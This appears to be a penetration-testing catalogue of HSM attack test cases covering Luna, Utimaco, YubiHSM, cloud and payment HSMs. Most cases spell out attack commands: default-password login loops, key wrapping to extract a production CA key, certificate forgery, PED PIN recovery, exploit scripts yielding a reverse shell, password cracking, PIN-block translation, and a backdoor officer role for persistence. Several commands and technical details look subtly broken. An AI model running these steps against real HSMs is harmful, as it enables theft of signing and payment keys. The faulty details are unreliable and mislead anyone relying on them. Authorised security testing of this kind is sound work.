# HSM Attack — Test Cases

> Structured test case templates for validating HSM attack coverage. Each case includes severity, prerequisites, test steps, expected results, remediation, pass criteria, and reference payload.

## Conventions

- **Severity**: CRITICAL / HIGH / MEDIUM / LOW
- **Prerequisites**: Required access, accounts, or pre-conditions
- **Pass Criteria**: Objective conditions indicating the test passes
- **Reference**: Pointer to the specific section in `payloads.md`

---

## A. Reconnaissance & Discovery

### TC-HSM-001 — HSM Vendor Fingerprint

**Severity**: LOW
**Prerequisites**: Network access to HSM endpoint

**Test Steps**:
1. `nmap -p 22,443,1500,1792,3322,4475,8080,9004 hsm.example.com`
2. For port 1792 (Thales Luna NTLS): `nc -w 3 hsm.example.com 1792 < /dev/null`
3. For port 4475 (Utimaco): `nc -w 3 hsm.example.com 4475 < /dev/null`
4. For port 9004 (nShield): `nc -w 3 hsm.example.com 9004 < /dev/null`
5. Probe HTTPS admin endpoints: `curl -sk https://hsm.example.com/api/v1/version`

**Expected Results**:
- Vendor + model + firmware version identified

**Remediation**:
- Restrict HSM ports to known app server IPs at network level
- Disable version disclosure on admin interface

**Pass Criteria**: Identified vendor, model, firmware

**Reference**: payloads.md §1

---

### TC-HSM-002 — PKCS#11 Module Discovery

**Severity**: LOW
**Prerequisites**: App server access

**Test Steps**:
1. `find / -name '*.so' -exec grep -l "C_GetFunctionList" {} \; 2>/dev/null`
2. For each module: `pkcs11-tool --module $MOD --show-info`
3. List slots: `pkcs11-tool --module $MOD --list-slots`

**Expected Results**:
- All PKCS#11 modules identified (Luna, Utimaco, nCipher, YubiHSM, CloudHSM)
- Slots enumerated

**Remediation**:
- Restrict file system access to PKCS#11 modules
- Audit PKCS#11 module loading

**Pass Criteria**: Identified ≥1 PKCS#11 module + slot count

**Reference**: payloads.md §2

---

### TC-HSM-003 — HSM Configuration File Recovery

**Severity**: HIGH
**Prerequisites**: Read on app server's `/etc`, `/opt`, `/var`

**Test Steps**:
1. `find / -name 'Chrystoki*.conf' -o -name 'luna*.cfg' 2>/dev/null`
2. `cat /etc/Chrystoki.conf`
3. Extract HSM IP, partition ID, PED paths
4. Look for client cache: `find / -name '.ped' 2>/dev/null`

**Expected Results**:
- Configuration files recovered
- PED key cache located

**Remediation**:
- File permissions on HSM config: 600 owned by app user only
- Encrypt PED cache at rest
- Audit access to HSM config files

**Pass Criteria**: Recovered HSM IP + partition ID

**Reference**: payloads.md §2, §3

---

## B. Default Credential Testing

### TC-HSM-004 — Luna Default PO Password

**Severity**: CRITICAL
**Prerequisites**: PO login screen access

**Test Steps**:
1. Try common defaults against Partition Officer:
   ```bash
   for pw in admin password luna REPLACE_WITH_YOUR_ORG; do
     lunacm -c partition -login -password "$pw" 2>&1 | grep -i success
   done
   ```

**Expected Results**:
- Hardened: random password ≥ 20 chars
- Vulnerable: default or weak password

**Remediation**:
- Generate random 20+ char password for PO
- Rotate quarterly
- Store in PAM / CyberArk

**Pass Criteria**: Logged in with default password

**Reference**: payloads.md §3

---

### TC-HSM-005 — YubiHSM 2 Default Password

**Severity**: CRITICAL
**Prerequisites**: YubiHSM 2 access

**Test Steps**:
1. Try defaults:
   ```bash
   for pw in password 0000 1234 admin yubihsm; do
     yubihsm-shell -a session -a 1 -p $pw 2>/dev/null && echo "GOT: $pw"
   done
   ```

**Expected Results**:
- Hardened: password rotated on init
- Vulnerable: still "password" default

**Remediation**:
- Rotate default password on first boot
- Document rotation in inventory

**Pass Criteria**: Logged in with "password"

**Reference**: payloads.md §8.1

---

### TC-HSM-006 — Utimaco Default Admin

**Severity**: CRITICAL
**Prerequisites**: Network access to Utimaco

**Test Steps**:
1. `csadm -s hsm.example.com:4475 -c login -u 0 -p admin`
2. `csadm -s hsm.example.com:4475 -c login -u 0 -p PASSWORD`
3. `csadm -s hsm.example.com:4475 -c login -u 0 -p admin123`

**Expected Results**:
- Hardened: M-of-N quorum required
- Vulnerable: default admin / admin

**Remediation**:
- Force M-of-N quorum (3-of-5 minimum)
- Rotate admin password
- Configure login lockout

**Pass Criteria**: Logged in with default admin

**Reference**: payloads.md §4.2

---

## C. PKCS#11 Attribute Abuse

### TC-HSM-007 — Find Extractable Keys

**Severity**: HIGH
**Prerequisites**: PKCS#11 login

**Test Steps**:
1. List all private keys with attributes:
   ```bash
   pkcs11-tool --module $MOD --login --pin $PIN --list-objects --type privkey -v | \
     grep -B5 -A1 'EXTRACTABLE: TRUE'
   ```
2. Catalogue keys with `CKA_EXTRACTABLE: TRUE`
3. Note keys with `CKA_WRAP: TRUE`

**Expected Results**:
- Hardened: 0 extractable / wrappable keys
- Vulnerable: any key extractable or wrappable

**Remediation**:
- Re-generate all keys with `CKA_EXTRACTABLE: FALSE`
- Restrict `CKA_WRAP` to specific wrapper keys only
- Audit key attributes weekly

**Pass Criteria**: Identified ≥1 extractable or wrappable key

**Reference**: payloads.md §6

---

### TC-HSM-008 — Wrap Attack: Extract Production Key

**Severity**: CRITICAL
**Prerequisites**: Wrappable target key + PO login

**Test Steps**:
1. Generate attacker RSA keypair on HSM:
   ```bash
   pkcs11-tool --module $MOD --login --pin $PIN \
     --keypairgen --key-type rsa:4096 --label attacker-rsa --id 0xab
   ```
2. Wrap production-CA private key with attacker public key:
   ```python
   session.wrapKey(attacker_pub, target_key,
                   PyKCS11.Mechanism(PyKCS11.CKM_RSA_PKCS, None))
   ```
3. Decrypt wrapped key offline with attacker private key:
   ```bash
   openssl pkey -in attacker.key -decrypt -in production-CA.wrapped -out raw.key
   ```

**Expected Results**:
- Hardened: wrap attack blocked by partition policy
- Vulnerable: plaintext private key recovered

**Remediation**:
- Set `CKA_EXTRACTABLE: FALSE` on production keys
- Partition policy 22 (allow extract) disabled
- Audit C_WrapKey calls

**Pass Criteria**: Recovered plaintext production CA key

**Reference**: payloads.md §6.1

---

### TC-HSM-009 — Key Derivation with Extractable Output

**Severity**: HIGH
**Prerequisites**: Derive key permission

**Test Steps**:
1. Use `C_DeriveKey` with template specifying `CKA_EXTRACTABLE: TRUE`:
   ```python
   session.deriveKey(baseKey, mechanism=CKM_ECDH1_DERIVE,
                     template=[(CKA_EXTRACTABLE, True)])
   ```
2. Extract derived key value
3. Use derived key outside HSM

**Expected Results**:
- Hardened: HSM rejects `CKA_EXTRACTABLE: TRUE` in derivation
- Vulnerable: derived key exfiltrated

**Remediation**:
- Partition policy: deny C_DeriveKey with extractable template
- Audit derivation operations

**Pass Criteria**: Exfiltrated derived key

**Reference**: payloads.md §6.3

---

### TC-HSM-010 — Sign Forgery via HSM

**Severity**: CRITICAL
**Prerequisites**: Sign permission on HSM CA key

**Test Steps**:
1. Generate attacker keypair: `openssl genrsa -out attacker.key 2048`
2. Create CSR with attacker's CN: `openssl req -new -key attacker.key -out attacker.csr -subj "/CN=internal-trusted/O=Trusted CA"`
3. Submit CSR to HSM for signing with production CA:
   ```bash
   pkcs11-tool --module $MOD --login --pin $PIN \
     --sign --mechanism SHA256-RSA-PKCS \
     --label production-CA \
     -i attacker.csr.der -o attacker.csr.signed
   ```
4. Construct forged certificate: `openssl x509 -req -in attacker.csr -CA production-ca.cert -CAkey <hsm-sign> -out forged.crt`

**Expected Results**:
- Hardened: CSR signing requires pre-approval (workflow), audit alerted
- Vulnerable: forged cert issued

**Remediation**:
- CSR signing workflow with 2-person approval
- Audit `C_Sign` on CA key
- Limit sign operations to approved CSR templates

**Pass Criteria**: Forged cert chains to trusted root

**Reference**: payloads.md §6.4

---

## D. Quorum Bypass

### TC-HSM-011 — PED Key Cache Recovery

**Severity**: CRITICAL
**Prerequisites**: App server file access

**Test Steps**:
1. Locate PED cache:
   ```bash
   find / -name '.ped' -o -name 'PED*' 2>/dev/null
   ls -la /var/luna/.ped 2>/dev/null
   ```
2. Dump PED key blob: `xxd /var/luna/.ped`
3. Reconstruct PIN via Luna PED emulator:
   ```python
   blob = open('/var/luna/.ped', 'rb').read()
   pin = blob[20:36].decode()
   print(pin)
   ```

**Expected Results**:
- Hardened: PED cache encrypted at rest or absent
- Vulnerable: PED key recovered in cleartext

**Remediation**:
- Encrypt PED cache with OS-level key (LUKS)
- Restrict file permissions to app user only
- Audit access to PED cache

**Pass Criteria**: Recovered PED PIN from cache

**Reference**: payloads.md §3.3, §7

---

### TC-HSM-012 — Quorum Spoofing from Single Workstation

**Severity**: CRITICAL
**Prerequisites**: Multiple PED key caches on one workstation

**Test Steps**:
1. Locate all PED caches on single workstation
2. Reconstruct all N quorum shares
3. Run `lunacm` with each share sequentially or in parallel
4. Achieve M-of-N quorum without other operators

**Expected Results**:
- Hardened: PED keys physically separated; cache lives on different machines
- Vulnerable: full quorum from single workstation

**Remediation**:
- Enforce physical separation: PED key shares on different machines
- Audit quorum participation from different source IPs
- Implement 2-person rule for admin operations

**Pass Criteria**: Achieved M-of-N quorum from single workstation

**Reference**: payloads.md §7

---

## E. Firmware Exploitation

### TC-HSM-013 — CVE-2024-47787 Luna RCE

**Severity**: CRITICAL
**Prerequisites**: Network access to vulnerable Luna firmware

**Test Steps**:
1. Identify Luna firmware version:
   ```bash
   ssh admin@hsm.example.com
   > firmware show
   ```
2. If < 7.13.4: exploit via pre-auth NTLS:
   ```bash
   python3 kali_luna_rce.py --target hsm.example.com
   ```
3. Observe reverse shell on attacker C2

**Expected Results**:
- Hardened: patched firmware
- Vulnerable: shell on HSM host OS

**Remediation**:
- Patch to ≥ 7.13.4
- Network segmentation
- Audit NTLS access from unauthorized IPs

**Pass Criteria**: Shell on HSM host

**Reference**: payloads.md §3.5

---

### TC-HSM-014 — CVE-2024-45294 Utimaco Auth Bypass

**Severity**: CRITICAL
**Prerequisites**: Network access to Utimaco

**Test Steps**:
1. Identify Utimaco version: `csadm -s hsm.example.com:4475 -c info`
2. If vulnerable: `python3 kali_utimaco_bypass.py --target hsm.example.com`
3. List users, export keys

**Expected Results**:
- Hardened: patched firmware
- Vulnerable: admin auth bypassed

**Remediation**:
- Patch to latest
- Restrict Utimaco port to known IPs

**Pass Criteria**: Authenticated as admin without credentials

**Reference**: payloads.md §4.3

---

## F. Cloud HSM Attacks

### TC-HSM-015 — AWS CloudHSM CU Password Brute Force

**Severity**: HIGH
**Prerequisites**: CloudHSM endpoint access

**Test Steps**:
1. Hash CU password hash from leaked config
2. `hashcat -m 16500 cu_hash.txt rockyou.txt`
3. Login as CU: `cloudhsm-cli login --username app --role crypto-user --password $PW`

**Expected Results**:
- Hardened: strong password, MFA
- Vulnerable: weak password cracked

**Remediation**:
- Strong CU passwords (≥ 32 chars random)
- Rotate annually
- Audit CloudHSM login logs

**Pass Criteria**: Logged in as CU via cracked password

**Reference**: payloads.md §9

---

### TC-HSM-016 — Fortanix DSM Tenant Isolation Bypass

**Severity**: CRITICAL
**Prerequisites**: Fortanix DSM account

**Test Steps**:
1. Create attacker account
2. List security objects:
   ```bash
   curl -sk https://sdkms.example.com/crypto/v1/security-objects -H "Authorization: Bearer $TOKEN" | jq '. | length'
   ```
3. Compare to expected (your account's keys only)

**Expected Results**:
- Hardened: tenant isolation enforced
- Vulnerable: other tenant keys leak

**Remediation**:
- Fortanix patch
- Multi-tenant HSM not used for high-value keys
- Use Dedicated HSM for sensitive workloads

**Pass Criteria**: Read ≥1 other tenant's key

**Reference**: payloads.md §12

---

## G. YubiHSM 2 Specific

### TC-HSM-017 — YubiHSM Object Enumeration

**Severity**: MEDIUM
**Prerequisites**: Auth key access

**Test Steps**:
1. `yubihsm-shell -a session -a 1 -p REPLACE_WITH_YOUR_PW`
2. `> list-objects`
3. `> get-object-info -i 0x0001 -t authentication-key`
4. `> get-object-info -i 0x0002 -t asymmetric-key`

**Expected Results**:
- Catalog of all objects on YubiHSM

**Remediation**:
- Audit YubiHSM objects weekly
- Document every object's purpose

**Pass Criteria**: Complete object inventory

**Reference**: payloads.md §8.2

---

### TC-HSM-018 — YubiHSM Wrap Extraction

**Severity**: HIGH
**Prerequisites**: Wrap permission

**Test Steps**:
1. `yubihsm-shell -a wrap-key --wrap-id 0x0001 --obj-id 0x0002 --out wrapped.bin`
2. Decrypt wrapped blob offline

**Expected Results**:
- Hardened: wrap key non-extractable
- Vulnerable: key exfiltrated

**Remediation**:
- Mark wrap key as non-extractable
- Audit wrap operations

**Pass Criteria**: Recovered wrapped key plaintext

**Reference**: payloads.md §8.3

---

## H. Payment HSM Attacks

### TC-HSM-019 — PIN Block Translation Attack

**Severity**: CRITICAL
**Prerequisites**: Payment HSM access (PayShield/Atalla)

**Test Steps**:
1. Recover ZPK-A (e.g., from key ceremony compromise)
2. Use PIN translation command:
   ```bash
   echo "CC1234...PIN_BLOCK_UNDER_A...ZPK_B" | nc hsm.example.com 1500
   ```
3. Recover plaintext PIN from response

**Expected Results**:
- Hardened: ZPK-A never reused; PIN block format 3 (no length leak)
- Vulnerable: PIN translated to attacker-readable form

**Remediation**:
- Use Format 3 PIN blocks (random padding, no length leak)
- Per-transaction ZPK rotation
- Audit PIN translation commands

**Pass Criteria**: Recovered plaintext PIN

**Reference**: payloads.md §13

---

### TC-HSM-020 — DUKPT Future Key Prediction

**Severity**: CRITICAL
**Prerequisites**: BDK + KSN sequence

**Test Steps**:
1. Recover BDK from HSM compromise
2. Capture KSN from a transaction
3. Predict next KSN: `ksn_next = ksn + 1`
4. Derive next transaction key: `key = DUKPT(bdk, ksn_next)`
5. Decrypt next transaction's PIN block

**Expected Results**:
- Hardened: BDK stored in HSM only; never extractable
- Vulnerable: future keys predictable

**Remediation**:
- BDK never leaves HSM
- Per-transaction key derivation in HSM only
- Audit BDK access

**Pass Criteria**: Decrypted future transaction

**Reference**: payloads.md §13.2

---

## I. Side Channel

### TC-HSM-021 — YubiHSM RSA Timing Oracle

**Severity**: HIGH
**Prerequisites**: YubiHSM 2 + timing equipment

**Test Steps**:
1. Submit 10k RSA operations with chosen plaintexts
2. Measure timing for each:
   ```python
   for pt in plaintexts:
       start = time.perf_counter_ns()
       yubihsm.decrypt(0x0001, pt)
       times.append(time.perf_counter_ns() - start)
   ```
3. Statistical analysis: distinguish key bits via Bleichenbacher-style oracle

**Expected Results**:
- Hardened: timing-resistant implementation (constant-time)
- Vulnerable: timing varies with key bits

**Remediation**:
- Apply RSA blinding (randomize input)
- Use constant-time implementation
- Patch firmware

**Pass Criteria**: Recovered ≥1 byte of plaintext key

**Reference**: payloads.md §8.4, §15

---

### TC-HSM-022 — Power Analysis on USB HSM

**Severity**: HIGH
**Prerequisites**: ChipWhisperer hardware + USB HSM

**Test Steps**:
1. Connect ChipWhisperer to USB HSM power line
2. Capture 10k AES operations with chosen plaintexts
3. Correlation Power Analysis (CPA):
   ```python
   attack = cwa.cpa(traces, plaintexts)
   key = attack.key
   ```

**Expected Results**:
- Hardened: HSM has power-analysis countermeasures (random delay, masking)
- Vulnerable: AES key recovered

**Remediation**:
- Masking (randomize intermediate values)
- Random delay insertion
- Use FIPS 140-3 Level 4 HSM (higher bar)

**Pass Criteria**: Recovered AES key

**Reference**: payloads.md §15

---

## J. Audit & Detection

### TC-HSM-023 — Audit Log Suppression

**Severity**: MEDIUM
**Prerequisites**: HSM admin access

**Test Steps**:
1. Try to manipulate audit log: `lunash:> audit clear`
2. Verify log forwarded off-device via syslog
3. Try `lunash:> audit rotate` mid-operation

**Expected Results**:
- Hardened: audit log forwarded off-device, immutable locally
- Vulnerable: log cleared or rotated without trace

**Remediation**:
- Forward audit log to SIEM (syslog, UDP)
- Local log is append-only
- Alert on log manipulation attempts

**Pass Criteria**: Audit log survives local manipulation

**Reference**: payloads.md §18

---

## K. Multi-Cloud HSM

### TC-HSM-024 — Cross-Region AWS CloudHSM Key Sync

**Severity**: MEDIUM
**Prerequisites**: Multi-region CloudHSM

**Test Steps**:
1. Identify clusters across regions: `aws cloudhsmv2 describe-clusters --region us-east-1`, `--region eu-west-1`
2. Check if keys synced between regions
3. Test if key generated in us-east-1 is accessible in eu-west-1

**Expected Results**:
- Hardened: keys region-local, not synced
- Vulnerable: keys accessible cross-region (data residency concern)

**Remediation**:
- Region-local keys
- Document residency
- Audit cross-region sync

**Pass Criteria**: Key accessible cross-region

**Reference**: payloads.md §9

---

## L. Persistence

### TC-HSM-025 — Backdoor Partition Officer Role

**Severity**: HIGH
**Prerequisites**: SO/HSM admin access

**Test Steps**:
1. Create additional PO role: `lunash:> partition createPO -password REPLACE_WITH_YOUR_BACKDOOR_PW`
2. Document PO name and password
3. Use backdoor PO for future access without modifying primary PO

**Expected Results**:
- Hardened: only 1 PO per partition; additional POs alerted
- Vulnerable: additional PO goes unnoticed

**Remediation**:
- Audit PO list weekly
- Alert on PO create/delete
- Single PO per partition

**Pass Criteria**: Used backdoor PO for unauthorized access

**Reference**: payloads.md §3.6

---

## Aggregate Pass Criteria

A successful engagement covers at minimum:
- **≥6 test cases passed across ≥3 HSM vendors** (Thales, Utimaco, nCipher, YubiHSM, CloudHSM)
- **≥1 CRITICAL case per vendor demonstrating full key extraction**
- **≥1 PKCS#11 attribute abuse** finding
- **≥1 quorum bypass finding** (PED cache, ACS recovery, smart card clone)
- **≥1 firmware exploitation finding** (CVE chain)
- **≥1 cloud HSM finding** (multi-tenant, cross-region)
- **≥1 detection rule** for at least one demonstrated attack
- **Persistence mechanism** documented (backdoor PO, wrap key)

---

## Reporting Template

```markdown
### TC-HSM-XXX — <Case Title>

**Status**: PASS / FAIL / PARTIAL
**Target**: <HSM vendor / model / firmware>
**Window**: <start> - <end> UTC
**Operator**: <name>

**Findings**:
- <bullet points>

**Evidence**:
- Audit log entries: <REDACTED>
- Wrapped key material: <path>
- Forged certs: <path>

**Impact**:
- <key compromise / cert forgery / multi-tenant leak>
- <certificates affected: count>
- <transactions affected: count>

**Remediation**:
1. <short-term>
2. <medium-term>
3. <long-term>

**Detection Rule**:
<sigma / falco query>

**References**:
- Vendor advisory: <URL>
- CVE: <id>
```

---

## References

- Thales Luna Documentation — https://thalesdocs.com/ctp/consoles/luna/
- Utimaco SecurityServer — https://utimaco.com/products/products-hardware-security-modules-hsm/securityserver-se
- Entrust nShield — https://www.entrust.com/digital-security/hardware-security-modules/nshield
- YubiHSM 2 — https://developers.yubico.com/YubiHSM2/
- AWS CloudHSM — https://docs.aws.amazon.com/cloudhsm/
- Azure Dedicated HSM — https://learn.microsoft.com/azure/dedicated-hsm/
- Google Cloud HSM — https://cloud.google.com/kms/docs/hsm
- Fortanix DSM — https://www.fortanix.com/products/data-security-manager/hsm
- PKCS#11 v3.0 — https://docs.oasis-open.org/pkcs11/pkcs11-spec/v3.0/
- FIPS 140-3 — Cryptographic Module Security Requirements
- Common Criteria EAL4+ / EAL5+
- ANSI X9.24 — Retail Financial Services Symmetric Key Management
- NIST SP 800-57 Part 2 — Key Management
- "Hardware Security Modules in Modern Cryptography" (Anderson, 2024)
